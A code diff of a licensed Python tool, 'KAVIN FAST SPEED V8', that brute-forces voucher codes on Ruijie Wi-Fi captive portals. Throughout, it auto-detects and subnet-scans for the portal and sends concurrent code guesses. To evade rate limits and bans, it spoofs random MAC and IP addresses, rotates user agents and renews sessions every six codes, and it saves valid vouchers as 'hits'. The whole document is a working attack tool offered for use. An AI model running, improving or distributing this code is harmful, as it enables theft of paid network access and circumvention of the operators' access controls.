@@ -1,5 +1,6 @@
 # =====================================================================
-# kavin_v8_fixed.py - KAVIN FAST SPEED V8 (Part 1 of 2) - HIT 100 VIEW
+# kavin_v8_fixed.py - KAVIN FAST SPEED V8 (Part 1 of 4)
+# Imports, Config, Utilities, License
 # =====================================================================
 
 import os
@@ -33,8 +34,10 @@ except ImportError:
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
+# ===================== CONFIG =====================
 HITS_FILE = "hits.txt"
 CONCURRENCY_LIMIT = 15
+CODES_PER_SESSION = 6
 RL_SLEEP = 0.0
 MAX_RL_SLEEP = 5.0
 
@@ -50,6 +53,7 @@ USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
 ]
 
+# ===================== GLOBAL =====================
 console = Console()
 tried_codes = set()
 code_lock = threading.Lock()
@@ -58,13 +62,17 @@ LICENSE_INFO = {"status": ""}
 _portal_cache = {"url": None, "params": None}
 
 
+# ===================== UTILITY =====================
 def generate_random_mac():
-    mac = [0x00, 0x16, 0x3e, random.randint(0x00, 0x7f), random.randint(0x00, 0xff), random.randint(0x00, 0xff)]
+    mac = [0x00, 0x16, 0x3e, random.randint(0x00, 0x7f),
+           random.randint(0x00, 0xff), random.randint(0x00, 0xff)]
     return ':'.join(map(lambda x: "%02x" % x, mac))
 
 
 def generate_random_ip():
-    return f"192.168.110.{random.randint(2, 254)}"
+    subnets = ["192.168.110", "192.168.1", "192.168.0", "10.0.0", "10.0.1", "172.16.0"]
+    subnet = random.choice(subnets)
+    return f"{subnet}.{random.randint(2, 254)}"
 
 
 def clear_screen():
@@ -82,6 +90,31 @@ def format_time(seconds):
         return "00:00:00"
 
 
+def get_my_ip():
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80))
+        ip = s.getsockname()[0]
+        s.close()
+        return ip
+    except Exception:
+        return "192.168.110.2"
+
+
+def get_gateway_ip():
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80))
+        ip = s.getsockname()[0]
+        s.close()
+        parts = ip.split('.')
+        parts[-1] = '1'
+        return '.'.join(parts)
+    except Exception:
+        return "192.168.110.1"
+
+
+# ===================== LICENSE =====================
 def check_license():
     if HAS_LICENSE_MODULE:
         try:
@@ -98,20 +131,10 @@ def activate_license(key):
         except Exception as e:
             return False, f"Error: {e}"
     return False, "No license module"
-
-
-def get_gateway_ip():
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        s.connect(("8.8.8.8", 80))
-        ip = s.getsockname()[0]
-        s.close()
-        parts = ip.split('.')
-        parts[-1] = '1'
-        return '.'.join(parts)
-    except Exception:
-        return "192.168.110.1"
-
+# =====================================================================
+# kavin_v8_fixed.py - KAVIN FAST SPEED V8 (Part 2 of 4)
+# Portal Detection, Hits File, Ruijie Session
+# =====================================================================
 
 def extract_params_from_url(url):
     parsed = urlparse(url)
@@ -131,6 +154,25 @@ def extract_params_from_url(url):
     return params
 
 
+def find_ruijie_gateway():
+    my_ip = get_my_ip()
+    parts = my_ip.split('.')
+    subnet = '.'.join(parts[:3])
+    candidates = [f"{subnet}.{i}" for i in [1, 254, 2, 253, 3, 252]]
+
+    session = requests.Session()
+    session.headers.update({'User-Agent': random.choice(USER_AGENTS)})
+
+    for gw in candidates:
+        try:
+            r = session.get(f"http://{gw}", timeout=2, allow_redirects=True, verify=False)
+            if "ruijie" in r.url.lower() or "ruijie" in r.text.lower():
+                return r.url
+        except Exception:
+            pass
+    return None
+
+
 def auto_detect_portal():
     if _portal_cache["url"]:
         return _portal_cache["url"]
@@ -141,7 +183,7 @@ def auto_detect_portal():
     ))
 
     session = requests.Session()
-    session.headers.update({'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36'})
+    session.headers.update({'User-Agent': random.choice(USER_AGENTS)})
 
     TEST_URL = "https://connectivitycheck.gstatic.com/generate_204"
     try:
@@ -154,7 +196,8 @@ def auto_detect_portal():
         pass
 
     console.print("[yellow][*][/yellow] Checking Gateways...")
-    gateways = [get_gateway_ip(), "192.168.110.1", "192.168.0.1", "10.44.77.254", "192.168.1.1"]
+    gateways = [get_gateway_ip(), "192.168.110.1", "192.168.0.1",
+                "10.44.77.254", "192.168.1.1"]
     gateways = list(dict.fromkeys(gateways))
 
     for gw in gateways:
@@ -166,9 +209,18 @@ def auto_detect_portal():
                 return res.url
         except Exception:
             pass
+
+    console.print("[yellow][*][/yellow] Scanning subnet...")
+    found = find_ruijie_gateway()
+    if found:
+        console.print("[bold green][+][/bold green] Detected via Subnet Scan!")
+        _portal_cache["url"] = found
+        return found
+
     return None
 
 
+# ===================== HITS FILE =====================
 def load_hits_from_file():
     hits = []
     try:
@@ -193,6 +245,7 @@ def load_hits_from_file():
     return hits
 
 
+# ===================== RUIJIE SESSION =====================
 async def fetch_official_session(session, gw_params, current_mac_ref, current_ip_ref):
     base = RUIJIE_WIFIDOG
     if "portal-mm-as" in str(gw_params.get("url", "")):
@@ -219,7 +272,8 @@ async def fetch_official_session(session, gw_params, current_mac_ref, current_ip
 
             if location:
                 loc_lower = location.lower()
-                if any(x in loc_lower for x in ["request limited", "error.html", "errormsg", "banned"]):
+                if any(x in loc_lower for x in ["request limited", "error.html",
+                                                 "errormsg", "banned"]):
                     return "BAN", "Banned"
 
                 q = parse_qs(urlparse(location).query)
@@ -234,6 +288,35 @@ async def fetch_official_session(session, gw_params, current_mac_ref, current_ip
         pass
 
     return None, "FAILED"
+# =====================================================================
+# kavin_v8_fixed.py - KAVIN FAST SPEED V8 (Part 3 of 4)
+# Hit Detection, Test Code, Code Generation, Notification, Dashboard
+# =====================================================================
+
+def is_real_hit(response_text, status_code):
+    if status_code != 200:
+        return False
+
+    low = response_text.lower()
+
+    fail_indicators = [
+        'invalid', 'wrong', 'failed', 'expired',
+        'not found', 'incorrect', 'error', 'denied',
+        'request limited', 'too many', 'blocked',
+    ]
+    if any(x in low for x in fail_indicators):
+        return False
+
+    success_indicators = [
+        '"success":true',
+        '"success": true',
+        '"authresult":"1"',
+        '"authresult": "1"',
+        'congratulations',
+        'logonurl',
+        'login success',
+    ]
+    return any(x in low for x in success_indicators)
 
 
 async def test_code_official(session, sess_data, code, mac, ip):
@@ -260,7 +343,8 @@ async def test_code_official(session, sess_data, code, mac, ip):
         payload["timestamp"] = sess_data['timestamp']
 
     try:
-        async with session.post(url, json=payload, headers=headers, timeout=3, ssl=False, allow_redirects=True) as r:
+        async with session.post(url, json=payload, headers=headers,
+                                timeout=3, ssl=False, allow_redirects=True) as r:
             if r.status == 429:
                 return "__RATE_LIMITED__", "1HR"
 
@@ -270,6 +354,7 @@ async def test_code_official(session, sess_data, code, mac, ip):
 
             final_url = str(r.url).lower()
             low = text.lower()
+
             if ("request%20limited" in final_url or "request limited" in final_url
                     or "request limited" in low or "too many" in low):
                 return "__RATE_LIMITED__", "1HR"
@@ -294,11 +379,12 @@ async def test_code_official(session, sess_data, code, mac, ip):
         return f"__ERROR__:{type(e).__name__}", "1HR"
 
 
+# ===================== CODE GENERATION =====================
 seq_counter = 0
 seq_lock = threading.Lock()
 
 
-def gen_code(mode, length, scan_method="random"):
+def gen_code(mode, length, scan_method="random", format_type="plain"):
     global seq_counter
     try:
         if scan_method == "sequential":
@@ -306,34 +392,68 @@ def gen_code(mode, length, scan_method="random"):
                 seq_counter += 1
                 current = seq_counter
             if mode == "num":
-                return str(current).zfill(length)
+                base = str(current).zfill(length)
             elif mode == "eng":
                 s, n = "", current
                 for _ in range(length):
                     s = chr(ord('a') + (n % 26)) + s
                     n //= 26
-                return s
+                base = s
             elif mode == "mix":
                 chars = string.ascii_lowercase + string.digits
                 s, n = "", current
                 for _ in range(length):
                     s = chars[n % 36] + s
                     n //= 36
-                return s
+                base = s
+            else:
+                base = ""
         else:
             if mode == "num":
-                return str(random.randint(0, 10**length - 1)).zfill(length)
+                base = str(random.randint(0, 10**length - 1)).zfill(length)
             elif mode == "eng":
-                return ''.join(random.choices(string.ascii_lowercase, k=length))
+                base = ''.join(random.choices(string.ascii_lowercase, k=length))
             elif mode == "mix":
-                return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
+                base = ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
+            else:
+                base = ""
+
+        if not base:
+            return ""
+
+        if format_type == "plain":
+            return base
+        elif format_type == "upper":
+            return base.upper()
+        elif format_type == "dash":
+            half = len(base) // 2
+            return f"{base[:half]}-{base[half:]}"
+        else:
+            return base
+    except Exception:
+        return ""
+
+
+# ===================== NOTIFICATION =====================
+def notify_hit(code, plan):
+    try:
+        print('\a', end='', flush=True)
     except Exception:
         pass
-    return ""
-# =====================================================================
-# kavin_v8_fixed.py - KAVIN FAST SPEED V8 (Part 2 of 2) - HIT 100 VIEW
-# =====================================================================
 
+    try:
+        from win10toast import ToastNotifier
+        toaster = ToastNotifier()
+        toaster.show_toast(
+            "VOUCHER HIT!",
+            f"Code: {code}\nPlan: {plan}",
+            duration=5
+        )
+    except Exception:
+        pass
+
+
+# ===================== DASHBOARD =====================
 from rich.console import Console as _Console
 _console_h = _Console()
 
@@ -351,13 +471,11 @@ def get_dashboard_renderable(mode, length, scan_method, current_code, tested,
     layout = Layout()
     header_text = Text("⚡ KAVIN FAST SPEED V8 ⚡", style="bold bright_cyan", justify="center")
 
-    # ===== HEADER (1 line) =====
     layout.split_column(
         Layout(Align.center(header_text), size=1),
         Layout(name="body", ratio=1)
     )
 
-    # ===== SESSION STATUS =====
     sess_upper = sess_stat.upper()
     if sess_upper == "REAL":
         sess_text = f"✅ REAL ({sess_id[:6]}...)"
@@ -397,7 +515,6 @@ def get_dashboard_renderable(mode, length, scan_method, current_code, tested,
     else:
         progress_pct = "RND"
 
-    # ===== COMPACT STATS BAR (2 lines ပဲ) =====
     line1 = Text()
     line1.append("🎯 ", style="bold")
     line1.append(f"{mode.upper()}-{length}", style="bold cyan")
@@ -423,15 +540,12 @@ def get_dashboard_renderable(mode, length, scan_method, current_code, tested,
     stats_text = Text("\n").join([line1, line2])
     stats_panel = Panel(stats_text, border_style="magenta", box=ROUNDED, height=4)
 
-    # ===== CURRENT CODE (1 line) =====
     check_text = Text()
     check_text.append("🎫 Checking  ➜  ", style="bold yellow")
     check_text.append(current_code if current_code else "------", style="bold bright_yellow")
     check_panel = Panel(Align.center(check_text), border_style="yellow", box=ROUNDED, height=3)
 
-    # ===== HITS TABLE (terminal ဆံ့သလောက် - အများဆုံး) =====
     term_h = _get_terminal_rows()
-    # header(1) + stats(4) + check(3) + footer(1) + borders(~3) = 12
     reserved = 12
     available_rows = max(term_h - reserved, 5)
 
@@ -444,7 +558,6 @@ def get_dashboard_renderable(mode, length, scan_method, current_code, tested,
     v_table.add_column("⏳ Plan", style="bold cyan", justify="center", width=7)
     v_table.add_column("🕐 Time", style="dim white", justify="center", width=10)
 
-    # အသစ်ဆုံးက အပေါ်မှာ
     display_hits = list(reversed(hits))
     hidden_count = 0
 
@@ -476,10 +589,8 @@ def get_dashboard_renderable(mode, length, scan_method, current_code, tested,
         box=ROUNDED
     )
 
-    # ===== FOOTER (1 line) =====
     footer_text = Text("👑 @kavin799 👑", style="bold bright_cyan", justify="center")
 
-    # ===== LAYOUT =====
     body_layout = Layout()
     body_layout.split_column(
         Layout(stats_panel, size=4),
@@ -489,9 +600,12 @@ def get_dashboard_renderable(mode, length, scan_method, current_code, tested,
     )
     layout["body"].update(body_layout)
     return layout
+# =====================================================================
+# kavin_v8_fixed.py - KAVIN FAST SPEED V8 (Part 4 of 4)
+# Main Scan Loop, Menus, Entry Point
+# =====================================================================
 
-
-async def scan_loop_async(mode, length, scan_method="random", gw_params=None):
+async def scan_loop_async(mode, length, scan_method="random", format_type="plain", gw_params=None):
     global seq_counter, tried_codes, RL_SLEEP
     tried_codes = set()
     seq_counter = 0
@@ -519,10 +633,11 @@ async def scan_loop_async(mode, length, scan_method="random", gw_params=None):
     current_mac = [generate_random_mac()]
     current_ip = [generate_random_ip()]
     sess_data = [None]
+    session_code_count = [0]
 
     semaphore = asyncio.Semaphore(CONCURRENCY_LIMIT)
-
     conn_limit = aiohttp.TCPConnector(limit=50, ssl=False)
+
     async with aiohttp.ClientSession(connector=conn_limit) as session:
         live = Live(
             get_dashboard_renderable(
@@ -540,9 +655,11 @@ async def scan_loop_async(mode, length, scan_method="random", gw_params=None):
 
             while True:
                 # ---- Session refresh ----
-                if sess_data[0] is None:
+                if sess_data[0] is None or session_code_count[0] >= CODES_PER_SESSION:
                     current_status[0] = "Refreshing Session..."
-                    res, err_msg = await fetch_official_session(session, gw_params, current_mac, current_ip)
+                    res, err_msg = await fetch_official_session(
+                        session, gw_params, current_mac, current_ip
+                    )
 
                     if res is None or err_msg == "FAILED":
                         current_mac[0] = generate_random_mac()
@@ -550,6 +667,7 @@ async def scan_loop_async(mode, length, scan_method="random", gw_params=None):
                         sess_stat[0] = "REFRESHING"
                         sess_id[0] = "--------"
                         current_status[0] = "Retrying Session..."
+                        session_code_count[0] = 0
                         await asyncio.sleep(0.2)
                         continue
 
@@ -557,6 +675,7 @@ async def scan_loop_async(mode, length, scan_method="random", gw_params=None):
                         sess_stat[0] = "BANNED"
                         sess_id[0] = "--------"
                         current_status[0] = "Cooldown..."
+                        session_code_count[0] = 0
                         await asyncio.sleep(1.0)
                         current_mac[0] = generate_random_mac()
                         current_ip[0] = generate_random_ip()
@@ -565,6 +684,7 @@ async def scan_loop_async(mode, length, scan_method="random", gw_params=None):
                     sess_data[0] = res
                     sess_stat[0] = err_msg
                     sess_id[0] = res.get('sessionId', '--------')
+                    session_code_count[0] = 0
                     current_status[0] = "Scanning..."
 
                 # ---- Generate batch ----
@@ -573,7 +693,7 @@ async def scan_loop_async(mode, length, scan_method="random", gw_params=None):
                 attempts = 0
                 while len(batch_codes) < CONCURRENCY_LIMIT and attempts < max_attempts:
                     attempts += 1
-                    c = gen_code(mode, length, scan_method)
+                    c = gen_code(mode, length, scan_method, format_type)
                     if not c:
                         continue
                     if scan_method == "sequential":
@@ -592,13 +712,15 @@ async def scan_loop_async(mode, length, scan_method="random", gw_params=None):
                 async def bounded_check(code):
                     async with semaphore:
                         return await test_code_official(
-                            session, sess_data[0], code, current_mac[0], current_ip[0]
+                            session, sess_data[0], code,
+                            current_mac[0], current_ip[0]
                         )
 
                 tasks = [bounded_check(code) for code in batch_codes]
                 results = await asyncio.gather(*tasks, return_exceptions=True)
 
                 tested += len(batch_codes)
+                session_code_count[0] += len(batch_codes)
 
                 hit_found_in_batch = False
                 session_expired_in_batch = False
@@ -615,6 +737,7 @@ async def scan_loop_async(mode, length, scan_method="random", gw_params=None):
                         sess_data[0] = None
                         sess_stat[0] = "EXPIRED"
                         current_status[0] = "Session Expired"
+                        session_code_count[0] = 0
                         session_expired_in_batch = True
                         break
 
@@ -622,6 +745,7 @@ async def scan_loop_async(mode, length, scan_method="random", gw_params=None):
                         sess_data[0] = None
                         sess_stat[0] = "BANNED"
                         current_status[0] = "Rate Limited"
+                        session_code_count[0] = 0
                         hit_found_in_batch = True
                         RL_SLEEP = min(RL_SLEEP + 0.5, MAX_RL_SLEEP)
                         await asyncio.sleep(RL_SLEEP)
@@ -637,6 +761,7 @@ async def scan_loop_async(mode, length, scan_method="random", gw_params=None):
                         sess_data[0] = None
                         sess_stat[0] = "BANNED"
                         current_status[0] = "Rate Limited"
+                        session_code_count[0] = 0
                         hit_found_in_batch = True
                         RL_SLEEP = min(RL_SLEEP + 0.5, MAX_RL_SLEEP)
                         await asyncio.sleep(RL_SLEEP)
@@ -644,7 +769,7 @@ async def scan_loop_async(mode, length, scan_method="random", gw_params=None):
                         current_ip[0] = generate_random_ip()
                         break
 
-                    # Detect hit
+                    # Hit Detection
                     is_hit = False
                     try:
                         j = json.loads(res)
@@ -652,8 +777,7 @@ async def scan_loop_async(mode, length, scan_method="random", gw_params=None):
                             if j["result"].get("logonUrl"):
                                 is_hit = True
                     except Exception:
-                        if ('"success":true' in low or '"authresult":"1"' in low
-                                or "congratulations" in low):
+                        if is_real_hit(res, 200):
                             is_hit = True
 
                     if is_hit:
@@ -667,7 +791,10 @@ async def scan_loop_async(mode, length, scan_method="random", gw_params=None):
                             except Exception:
                                 pass
 
+                        notify_hit(code, plan)
+
                         sess_data[0] = None
+                        session_code_count[0] = 0
                         current_mac[0] = generate_random_mac()
                         current_ip[0] = generate_random_ip()
                         sess_stat[0] = "HIT (Refreshing)"
@@ -711,7 +838,7 @@ async def scan_loop_async(mode, length, scan_method="random", gw_params=None):
                 except Exception:
                     pass
 
-            # ===== FINAL HIT SUMMARY (Hit အားလုံး အပြည့်အစုံ ပြ) =====
+            # FINAL SUMMARY
             if hits:
                 console.print("\n")
                 console.print(Panel(
@@ -738,6 +865,7 @@ async def scan_loop_async(mode, length, scan_method="random", gw_params=None):
                 console.print()
 
 
+# ===================== UI MENUS =====================
 def show_banner():
     clear_screen()
     console.print()
@@ -793,6 +921,23 @@ def ask_scan_method():
         return {"1": "random", "2": "sequential"}[choice]
 
 
+def ask_format():
+    while True:
+        show_banner()
+        console.print("  [bold bright_white]Choose Voucher Format:[/bold bright_white]\n")
+        console.print("  [bold bright_cyan]1.[/bold bright_cyan] 📝  Plain (abc123)")
+        console.print("  [bold bright_cyan]2.[/bold bright_cyan] 🔠  UPPER (ABC123)")
+        console.print("  [bold bright_cyan]3.[/bold bright_cyan] ➖  Dash (ABC-123)")
+        console.print("  [bold bright_red]0.[/bold bright_red] ↩ Back\n")
+        choice = Prompt.ask("  [bright_cyan]➜ Select[/bright_cyan]").strip()
+        if choice == "0":
+            return None
+        if choice not in ("1", "2", "3"):
+            continue
+        return {"1": "plain", "2": "upper", "3": "dash"}[choice]
+
+
+# ===================== RUN =====================
 def run():
     show_banner()
     portal_url = auto_detect_portal()
@@ -836,5 +981,68 @@ def run():
         scan_method = ask_scan_method()
         if scan_method is None:
             continue
+        format_type = ask_format()
+        if format_type is None:
+            continue
 
-       
+        try:
+            asyncio.run(scan_loop_async(
+                mode, length,
+                scan_method=scan_method,
+                format_type=format_type,
+                gw_params=gw_params
+            ))
+        except KeyboardInterrupt:
+            pass
+        break
+
+
+def main():
+    global LICENSE_INFO
+    try:
+        is_valid, expiry_msg = check_license()
+        while not is_valid:
+            clear_screen()
+            console.print(Panel(
+                Align.center(Text("⚡ KAVIN FAST SPEED V8 ⚡", style="bold bright_magenta")),
+                border_style="bright_magenta"
+            ))
+            console.print(Panel(
+                Align.center(Text("🔐 Enter License Key to Continue 🔐", style="bold yellow")),
+                border_style="yellow"
+            ))
+            key = Prompt.ask("   [bold bright_green]➜ 📝 Paste Key Here[/bold bright_green]").strip()
+            if key:
+                ok, msg = activate_license(key)
+                console.print(Panel(
+                    Align.center(Text(msg, style="bold bright_green" if ok else "bold red")),
+                    border_style="green" if ok else "red"
+                ))
+                time.sleep(2)
+                is_valid, expiry_msg = check_license()
+            else:
+                time.sleep(1)
+
+        LICENSE_INFO["status"] = expiry_msg
+        run()
+    except (KeyboardInterrupt, EOFError):
+        console.print("\n\n[bold red]Exiting Kavin Scanner V8...[/bold red]\n")
+    except Exception as e:
+        console.print(f"[bold red]Error: {e}[/bold red]")
+    finally:
+        try:
+            clear_screen()
+        except Exception:
+            pass
+        try:
+            console.print("\n\n")
+            console.print(Text("✨ Thank You • Contact @kavin799 for Key 🙏",
+                               style="bold bright_green"), justify="center")
+            console.print("\n\n")
+            time.sleep(1)
+        except Exception:
+            pass
+
+
+if __name__ == "__main__":
+    main()
